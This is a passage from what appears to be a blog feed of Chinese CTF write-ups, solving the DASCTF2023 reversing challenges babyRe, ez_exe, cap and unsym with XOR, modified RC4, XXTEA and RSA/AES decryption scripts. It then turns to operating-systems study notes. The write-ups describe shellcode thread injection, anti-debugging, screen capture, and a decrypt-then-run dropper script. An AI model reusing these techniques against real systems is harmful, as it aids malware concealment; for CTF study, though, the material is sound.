assaaaaaaaaA</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># z=3</span><br><span class="hljs-comment"># ==1=======</span><br><span class="hljs-comment"># ==1=======</span><br><span class="hljs-comment"># ==1=11====</span><br><span class="hljs-comment"># ==11==1===</span><br><span class="hljs-comment"># ==11======</span><br><span class="hljs-comment"># ==11======</span><br><span class="hljs-comment"># ==11==1===</span><br><span class="hljs-comment"># ==1=11====</span><br><span class="hljs-comment"># ==1=======</span><br><span class="hljs-comment"># ==1=======</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># sssssssssS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># z=5</span><br><span class="hljs-comment"># ===1======</span><br><span class="hljs-comment"># ===1======</span><br><span class="hljs-comment"># ===1======</span><br><span class="hljs-comment"># ===1======</span><br><span class="hljs-comment"># ===1======</span><br><span class="hljs-comment"># ==11======</span><br><span class="hljs-comment"># ==1=======</span><br><span class="hljs-comment"># 111=======</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment"># ==========</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># dddwwdwwwwwW</span><br><span class="hljs-comment"># w</span><br><br><span class="hljs-comment">#0 -&gt; 1 -&gt; 2 -&gt; 4 -&gt;3 -&gt;5 -&gt; 0</span><br><span class="hljs-comment"># wddwwdddddDdwwwdddsdddddDwwWassaaaaaaaaAsssssssssSddwwdwwwwwWw</span><br></code></pre></td></tr></table></figure><h1 id="dasctf2023二进制"><a class="markdownIt-Anchor" href="#dasctf2023二进制"></a> DASCTF2023二进制</h1><h2 id="babyre"><a class="markdownIt-Anchor" href="#babyre"></a> babyRe</h2><ul><li><p>查看关键函数，发现是一个线程注入的技术 注入的代码是从资源中解密出的shellcode，分析线程的shellcode，其中存在两个反调试</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307092154373.png" alt="image-20230709215416238" /></p></li><li><p>其中judge……函数中存在调试判断，这里对于调试进行处理后，动调卡在了 <code>argc!=2</code> 的判断上，所以动态得到shellcode的数据不不成功(自己绕过后还是因为参数不为2的原因调试失败)</p></li><li><p>之后重点关注杜宇“cod”数据的处理，由xor函数可以知道这是对于cod进行异或处理，则得到资源文件，之后进行异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;COD101.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>key=[<span class="hljs-number">24</span>, <span class="hljs-number">87</span>, <span class="hljs-number">104</span>, <span class="hljs-number">100</span>]<br>arr = []<br><span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f):<br>    arr.append(key[i%<span class="hljs-number">4</span>]^j)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dump&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(<span class="hljs-built_in">bytes</span>(arr))<br></code></pre></td></tr></table></figure></li><li><p>得到dump文件后，进行64位分析，将其中(call+5)与sub_1EE进行nop以及调整retn后，程序大致可以看出来了为魔改的RC4算法，由此结合后面的StartAddress来进行解密处理</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307092200561.png" alt="image-20230709220059494" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> size1 = <span class="hljs-number">0x100</span>;<br><br><span class="hljs-type">void</span> __stdcall  <span class="hljs-title function_">rc4</span><span class="hljs-params">(<span class="hljs-type">char</span>* data)</span><br>&#123;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sbox[<span class="hljs-number">257</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, j, k;<br> <span class="hljs-type">int</span> tmp;<br> <span class="hljs-type">char</span> key[] = &#123; <span class="hljs-number">93</span> ,<span class="hljs-number">66</span>,<span class="hljs-number">98</span>,<span class="hljs-number">41</span>,<span class="hljs-number">3</span>,<span class="hljs-number">54</span>,<span class="hljs-number">71</span>,<span class="hljs-number">65</span>,<span class="hljs-number">21</span>,<span class="hljs-number">54</span> &#125;;<br> <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br> <span class="hljs-type">char</span>* p = data;<br><br> <span class="hljs-keyword">while</span> (*p)<br> &#123;<br>  len++;<br>  p++;<br> &#125;<br> <span class="hljs-comment">//printf(&quot;len:%d\n&quot;, len);</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size1; i++) &#123;<br>  sbox[i] = i;<br> &#125;<br><br> j = k = <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size1; i++) &#123;<br>  tmp = sbox[i];<br>  j = (<span class="hljs-number">2</span> * j + tmp + key[k]) % size1;<br>  sbox[i] = sbox[j];<br>  sbox[j] = tmp;<br>  <span class="hljs-keyword">if</span> (++k &gt;= <span class="hljs-number">10</span>)<br>   k = <span class="hljs-number">0</span>;<br> &#125;<br> j = k = <span class="hljs-number">0</span>;<br> <span class="hljs-type">int</span> R;<br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>  j = (j + k) % size1;<br>  k = (k + sbox[j]) % size1;<br><br>  tmp = sbox[j];<br>  sbox[j] = sbox[k];<br>  sbox[k] = tmp;<br><br><br>  R = sbox[(sbox[j] + sbox[k] + k) % size1];<br>  data[i] -= (i % <span class="hljs-number">13</span>);<br>  data[i] ^= R ;<br>  <br> &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-type">char</span> enc[]=&#123; <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xEC</span>, <br>  <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xDA</span>, <br>  <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xC6</span>, <br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x37</span>, <br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x58</span>&#125;;<br> rc4(enc);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,enc);<br>&#125; <br></code></pre></td></tr></table></figure></li></ul><h2 id="ez_exe"><a class="markdownIt-Anchor" href="#ez_exe"></a> ez_exe</h2><ul><li><p>这是一个Python打包而成的exe文件，利用python进行解出源码，之后运行程序，得到需要同样方法解密bin2</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307092218547.png" alt="image-20230709221810499" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> wintypes<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> Structure<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> _STARTUPINFO<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> _PROCESS_INFORMATION<br><br>StartupInfo = _STARTUPINFO()<br>ProcessInfo = _PROCESS_INFORMATION()<br><br>key1 = md5(<span class="hljs-string">b&#x27;bin1bin1bin1&#x27;</span>).hexdigest().encode()<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bin1&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>arr = [key1[i % <span class="hljs-built_in">len</span>(key1)] ^ file[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file))]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bin1&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">bytes</span>(arr))<br><br>time.sleep(<span class="hljs-number">0</span>)<br><br>bet = ctypes.windll.kernel32.CreateProcessA(<span class="hljs-string">b&#x27;bin1&#x27;</span>, ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), byref(StartupInfo), byref(ProcessInfo))<br><br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ProcessInfo.hProcess), ctypes.c_int(-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bin1&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(file)<br></code></pre></td></tr></table></figure></li></ul><h3 id="法1"><a class="markdownIt-Anchor" href="#法1"></a> 法1</h3><ul><li><p>之后查看源码的字节码，得到加密过程为根据密钥进行异或处理，然后再对bin2进行解密，得到bin_dump文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>key1 = <span class="hljs-built_in">bytes</span>(md5(<span class="hljs-string">b&quot;bin2bin2bin2&quot;</span>).hexdigest().encode())<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bin2&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>arr = [key1[i % <span class="hljs-built_in">len</span>(key1)] ^ file[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file))]<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bin_dump&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(<span class="hljs-built_in">bytes</span>(arr))<br></code></pre></td></tr></table></figure></li></ul><h3 id="法2"><a class="markdownIt-Anchor" href="#法2"></a> 法2</h3><ul><li><p>观察源码，这是先解密，之后再加密的操作，这里直接把<strong>pyc</strong>里的密钥<code>bin1</code>改成<code>bin2</code>，加密后的结果存储在<code>bin3</code>中，然后使用python3.11运行pyc文件</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307092300898.png" alt="image-20230709230022851" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307092300148.png" alt="image-20230709230031072" /></p></li><li><p>报错，但是可以用，之后就是正常解密后的bin2文件了</p></li></ul><h3 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5"></a> exp</h3><ul><li><p>得到的bin_dump是一个32位exe文件，其中进行了<a href="https://blog.csdn.net/libinjlu/article/details/43030369">btea加密</a>，直接获取数据解密即可</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307092241730.png" alt="image-20230709224140685" /></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><br>using namespace std;<br><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><br>//delta changed<br><span class="hljs-comment">#define DELTA 0x7937B99E</span><br><span class="hljs-comment">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br>void btea(uint32_t* v, <span class="hljs-built_in">int</span> n, uint32_t const key[<span class="hljs-number">4</span>]) &#123;<br>uint32_t y, z, <span class="hljs-built_in">sum</span>;<br>unsigned p, rounds, e;<br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123;          /* Coding Part */<br>rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br><span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span>;<br>z = v[n - <span class="hljs-number">1</span>];<br>do &#123;<br><span class="hljs-built_in">sum</span> += DELTA;<br>e = (<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br><span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) &#123;<br>y = v[p + <span class="hljs-number">1</span>];<br>z = v[p] += MX;<br>&#125;<br>y = v[<span class="hljs-number">0</span>];<br>z = v[n - <span class="hljs-number">1</span>] += MX;<br>&#125; <span class="hljs-keyword">while</span> (--rounds);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; -<span class="hljs-number">1</span>) &#123;  /* Decoding Part */<br>n = -n;<br>//<span class="hljs-built_in">round</span> changed <br>rounds =  <span class="hljs-number">52</span> / n;<br><span class="hljs-built_in">sum</span> = rounds * DELTA;<br>y = v[<span class="hljs-number">0</span>];<br>do &#123;<br>e = (<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br><span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>z = v[p - <span class="hljs-number">1</span>];<br>y = v[p] -= MX;<br>&#125;<br>z = v[n - <span class="hljs-number">1</span>];<br>y = v[<span class="hljs-number">0</span>] -= MX;<br>&#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">sum</span> -= DELTA) != <span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-built_in">int</span> main()<br>&#123;<br>uint32_t key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>key[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4B5F</span>;<br>key[<span class="hljs-number">1</span>] = <span class="hljs-number">0xDEAD</span>;<br>key[<span class="hljs-number">2</span>] = <span class="hljs-number">0x11ED</span>;<br>key[<span class="hljs-number">3</span>] = <span class="hljs-number">0xB3CC</span>;<br>uint32_t v5[<span class="hljs-number">11</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>v5[<span class="hljs-number">0</span>] = <span class="hljs-number">0xCC45699D</span>;<br>v5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x683D5352</span>;<br>v5[<span class="hljs-number">2</span>] = <span class="hljs-number">0xB8BB71A0</span>;<br>v5[<span class="hljs-number">3</span>] = <span class="hljs-number">0xD3817AD</span>;<br>v5[<span class="hljs-number">4</span>] = <span class="hljs-number">0x7547E79E</span>;<br>v5[<span class="hljs-number">5</span>] = <span class="hljs-number">0x4BDD8C7C</span>;<br>v5[<span class="hljs-number">6</span>] = <span class="hljs-number">0x95E25A81</span>;<br>v5[<span class="hljs-number">7</span>] = <span class="hljs-number">0xC4525103</span>;<br>v5[<span class="hljs-number">8</span>] = <span class="hljs-number">0x7049B46F</span>;<br>v5[<span class="hljs-number">9</span>] = <span class="hljs-number">0x5417F77C</span>;<br>v5[<span class="hljs-number">10</span>] = <span class="hljs-number">0x65567138</span>;<br>btea(v5, -<span class="hljs-number">11</span>, key);<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++)<br>&#123;<br>printf(<span class="hljs-string">&quot;%c&quot;</span>,*((char *)v5 +i) &amp; <span class="hljs-number">0xff</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cap"><a class="markdownIt-Anchor" href="#cap"></a> cap</h2><ul><li><p>程序主逻辑：程序截图并进行处理保存为cap.bin(对于API的查找发现这里一起调用最终会实现屏幕图像截取的功能，这里最终会生成一个bmp文件)</p></li><li><p>首先查看cap.bin文件</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101540001.png" alt="image-20230710154058936" /></p></li><li><p>之后动调程序，发现在程序中进行了异或处理，对于异或数值的观察中发现，这里异或的对象中出现了(0x42,0x4D—这是bmp文件的首部标识)，同时出现了nc_by_dasctf的可能异或密钥的字符</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101552629.png" alt="image-20230710155205577" /></p></li><li><p>之后对于文件进行逐一字符查看，最后看出这是对于cap.bin文件的异或处理</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101554841.png" alt="img" /></p></li><li><p>之后从密钥第二位开始，循环异或。注意这里需要使用最开始的cap.bin进行操作，因为每次运行re3.exe，就是进行截屏操作，所以需要使用最开始的cap.bin文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&quot;enc_by_dasctf&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cap.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    s = <span class="hljs-built_in">bytearray</span>(f.read())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s[i] ^= <span class="hljs-built_in">ord</span>(key[(i+<span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(key)])<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.bmp&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(s)<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101559824.png" alt="image-20230710155936627" /></p></li></ul><h2 id="unsym"><a class="markdownIt-Anchor" href="#unsym"></a> unsym</h2><ul><li><p>go语言逆向，使用 <code>go_parser</code> 恢复符号表，之后在main_main中发现了65537，同时其中与大整数相关，猜测可能与RSA有关</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101607362.png" alt="image-20230710160723312" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101607433.png" alt="image-20230710160744386" /></p></li><li><p>之后查看程序的逻辑流程，发现通过RSA判断KEY的正确性，右边是KEY正确的路径</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101613005.png" alt="image-20230710161319957" /></p></li><li><p>后来对文件message进行AES(CBC)加密，之后保存为encrypted.bin文件</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101615358.png" alt="image-20230710161513312" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202307101615248.png" alt="image-20230710161538200" /></p></li><li><p>之后写脚本进行解密工作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br>n = <span class="hljs-number">0x1d884d54d21694ccd120f145c8344b729b301e782c69a8f3073325b9c5</span><br>p = <span class="hljs-number">37636318457745167234140808130156739</span><br>q = <span class="hljs-number">21154904887215748949280410616478423</span><br>c = <span class="hljs-number">0xfad53ce897d2c26f8cad910417fbdd1f0f9a18f6c1748faca10299dc8</span><br>e = <span class="hljs-number">0x10001</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><br>password = long_to_bytes(m)  <span class="hljs-comment"># 秘钥必须为 16 字节或者 16 字节的倍数的字节型数据</span><br>iv = long_to_bytes(m)  <span class="hljs-comment"># iv 偏移量，bytes 类型</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;encrypted.bin&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    en_text = f.read()<br>aes = AES.new(password, AES.MODE_CBC, iv)  <span class="hljs-comment"># CBC 模式下解密需要重新创建一个 aes 对象</span><br>de_text = aes.decrypt(en_text)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decrypt.exe&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(de_text)<br></code></pre></td></tr></table></figure></li><li><p>运行decrypt.exe得到了flag</p></li></ul><h1 id="vnctf2023"><a class="markdownIt-Anchor" href="#vnctf2023"></a> VNCTF2023</h1><h1 id="西湖论剑2023"><a class="markdownIt-Anchor" href="#西湖论剑2023"></a> 西湖论剑2023</h1><h1 id="ciscn"><a class="markdownIt-Anchor" href="#ciscn"></a> CISCN</h1>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统</title>
    <link href="/posts/d04bd5bc.html"/>
    <url>/posts/d04bd5bc.html</url>
    
    <content type="html"><![CDATA[<h1 id="概论"><a class="markdownIt-Anchor" href="#概论"></a> 概论</h1><h2 id="问题相关"><a class="markdownIt-Anchor" href="#问题相关"></a> 问题相关</h2><ul><li>操作系统的定义、功能、特征及其含义  P1-2-3-5</li><li>操作系统的分类及其特点，实时、分时、网络、嵌入式等  P11</li><li>操作系统的接口有哪些  P15</li><li>操作系统的发展、功能及特点，并发、共享、异步(随机)、虚拟各有什么含义  P9</li><li>了解现在热门的操作系统、国产操作系统</li></ul><h3 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h3><ul><li>定义：操作系统是一组计算机程序的集合，主要用以控制和管理计算机的硬件和软件资源，合理地组织计算机的工作流程， 向应用程序和用户提供方便、快捷、友好的使用接口</li><li>特征：<ul><li>并发性–两个或多个事件在同一时间间隔内发生</li><li>共享性–共享计算机的硬件和软件资源，分为互斥共享方式和交替共享方式</li><li>随机性(异步性)–每道程序在何时运行，各个程序运行的顺序，以及每道程序所需的时间都是不确定的，也是不可预知的</li><li>虚拟性–将一个物理实体映射为一个或多个逻辑对象</li></ul></li><li>接口：<ul><li>程序接口：系统调用，API</li><li>操作接口：命令界面，图形界面，作业控制命令</li></ul></li></ul><h1 id="进程管理"><a class="markdownIt-Anchor" href="#进程管理"></a> 进程管理</h1><h2 id="问题相关-2"><a class="markdownIt-Anchor" href="#问题相关-2"></a> 问题相关</h2><ul><li>顺序执行、并发执行、并行执行  P31</li><li>进程的概念与特征，与程序的区别与联系，进程与线程的区别与联系，进程上下文  P33-70</li><li>三态模型、五态模型及七态模型的状态转化  P34-35-36</li><li>什么是进程控制块？包含哪些信息？有什么功能？  P36</li><li>同步与互斥概念，饥饿与死锁概念，临界区与临界资源概念，临界区调度原则与管理方法  P40-41-42</li><li>进程通信的机制及对应的工作原理(重点管道通信)  P52</li><li>进程调度模型及其对应的主要功能  P56</li><li>死锁产生的四个必要条件，预防、避免、检测及接触死锁对应的方法  P65</li></ul><h3 id="执行"><a class="markdownIt-Anchor" href="#执行"></a> 执行</h3><ul><li>顺序执行：<ul><li>一个具有独立功能的程序独占处理器直至最终结束的过程称为程序的顺序执行</li><li>顺序性，封闭性、可再现性</li></ul></li><li>并发执行：<ul><li>多个事件在同一时期内发生</li><li>本质是一个CPU在多个程序运行过程中的时分复用</li><li>间断性、开放性、不可再现性</li></ul></li></ul><h3 id="进程"><a class="markdownIt-Anchor" href="#进程"></a> 